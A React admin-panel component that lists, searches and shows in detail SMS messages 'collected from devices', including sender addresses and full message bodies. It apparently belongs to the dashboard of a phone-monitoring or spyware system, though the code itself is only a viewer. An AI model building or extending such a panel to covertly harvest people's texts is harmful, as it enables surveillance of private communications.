import React, { useState, useEffect, useCallback } from 'react';
import { toast } from 'react-toastify';
import './AdminViews.css';

const SMSView = () => {
  const [smsMessages, setSmsMessages] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterType, setFilterType] = useState('all');
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [selectedSMS, setSelectedSMS] = useState(null);

  const fetchSMS = useCallback(async () => {
    try {
      setLoading(true);
      const response = await fetch(`/api/sms?page=${currentPage}&type=${filterType}`);
      if (response.ok) {
        const data = await response.json();
        setSmsMessages(data.sms || []);
        setTotalPages(data.totalPages || 1);
      } else {
        toast.error('Failed to fetch SMS messages');
      }
    } catch (error) {
      console.error('Error fetching SMS:', error);
      toast.error('Error loading SMS messages');
    } finally {
      setLoading(false);
    }
  }, [currentPage, filterType]);

  useEffect(() => {
    fetchSMS();
  }, [fetchSMS]);

  const filteredSMS = smsMessages.filter(sms =>
    sms.address.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sms.body.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sms.deviceId.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  const getTypeBadge = (type) => {
    const typeColors = {
      inbox: '#28a745',
      sent: '#007bff',
      draft: '#ffc107',
      outbox: '#17a2b8',
      failed: '#dc3545',
      queued: '#6c757d',
      unknown: '#6c757d'
    };
    
    return (
      <span 
        className="type-badge"
        style={{ backgroundColor: typeColors[type] || '#6c757d' }}
      >
        {type}
      </span>
    );
  };

  const viewSMSDetails = (sms) => {
    setSelectedSMS(sms);
  };

  const closeModal = () => {
    setSelectedSMS(null);
  };

  const truncateText = (text, maxLength = 100) => {
    if (!text) return 'N/A';
    if (text.length <= maxLength) return text;
    return text.substring(0, maxLength) + '...';
  };

  if (loading) {
    return <div className="loading">Loading SMS messages...</div>;
  }

  return (
    <div className="admin-view">
      <div className="view-header">
        <h1>💬 SMS Management</h1>
        <p>Monitor all collected SMS messages from devices</p>
      </div>

      <div className="controls">
        <div className="search-filter">
          <input
            type="text"
            placeholder="Search SMS messages..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="search-input"
          />
          <select
            value={filterType}
            onChange={(e) => setFilterType(e.target.value)}
            className="filter-select"
          >
            <option value="all">All Types</option>
            <option value="inbox">Inbox</option>
            <option value="sent">Sent</option>
            <option value="draft">Draft</option>
            <option value="outbox">Outbox</option>
            <option value="failed">Failed</option>
            <option value="queued">Queued</option>
            <option value="unknown">Unknown</option>
          </select>
        </div>
        <button onClick={fetchSMS} className="refresh-btn">
          🔄 Refresh
        </button>
      </div>

      <div className="stats-summary">
        <div className="stat-item">
          <span className="stat-label">Total SMS:</span>
          <span className="stat-value">{smsMessages.length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Inbox:</span>
          <span className="stat-value">{smsMessages.filter(s => s.type === 'inbox').length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Sent:</span>
          <span className="stat-value">{smsMessages.filter(s => s.type === 'sent').length}</span>
        </div>
        <div className="stat-item">
          <span className="stat-label">Draft:</span>
          <span className="stat-value">{smsMessages.filter(s => s.type === 'draft').length}</span>
        </div>
      </div>

      <div className="data-table">
        <table>
          <thead>
            <tr>
              <th>Device ID</th>
              <th>Address</th>
              <th>Message</th>
              <th>Type</th>
              <th>Date</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            {filteredSMS.map((sms) => (
              <tr key={sms._id}>
                <td>
                  <div className="device-id">
                    <span className="id-text">{sms.deviceId}</span>
                  </div>
                </td>
                <td>
                  <div className="sms-address">
                    {sms.address}
                  </div>
                </td>
                <td>
                  <div className="sms-body">
                    {truncateText(sms.body, 80)}
                  </div>
                </td>
                <td>{getTypeBadge(sms.type)}</td>
                <td>{formatDate(sms.date)}</td>
                <td>
                  <button
                    onClick={() => viewSMSDetails(sms)}
                    className="view-btn"
                  >
                    👁️ View
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {totalPages > 1 && (
        <div className="pagination">
          <button
            onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
            disabled={currentPage === 1}
            className="page-btn"
          >
            Previous
          </button>
          <span className="page-info">
            Page {currentPage} of {totalPages}
          </span>
          <button
            onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
            disabled={currentPage === totalPages}
            className="page-btn"
          >
            Next
          </button>
        </div>
      )}

      {/* SMS Details Modal */}
      {selectedSMS && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h2>SMS Details</h2>
              <button onClick={closeModal} className="close-btn">×</button>
            </div>
            <div className="modal-body">
              <div className="detail-section">
                <h3>Basic Information</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Device ID:</label>
                    <span>{selectedSMS.deviceId}</span>
                  </div>
                  <div className="detail-item">
                    <label>Address:</label>
                    <span>{selectedSMS.address}</span>
                  </div>
                  <div className="detail-item">
                    <label>Type:</label>
                    <span>{getTypeBadge(selectedSMS.type)}</span>
                  </div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Message Content</h3>
                <div className="detail-item full-width">
                  <label>Body:</label>
                  <div className="content-text">{selectedSMS.body}</div>
                </div>
              </div>

              <div className="detail-section">
                <h3>Timestamps</h3>
                <div className="detail-grid">
                  <div className="detail-item">
                    <label>Date:</label>
                    <span>{formatDate(selectedSMS.date)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Timestamp:</label>
                    <span>{formatDate(selectedSMS.timestamp)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Created:</label>
                    <span>{formatDate(selectedSMS.createdAt)}</span>
                  </div>
                  <div className="detail-item">
                    <label>Updated:</label>
                    <span>{formatDate(selectedSMS.updatedAt)}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default SMSView; 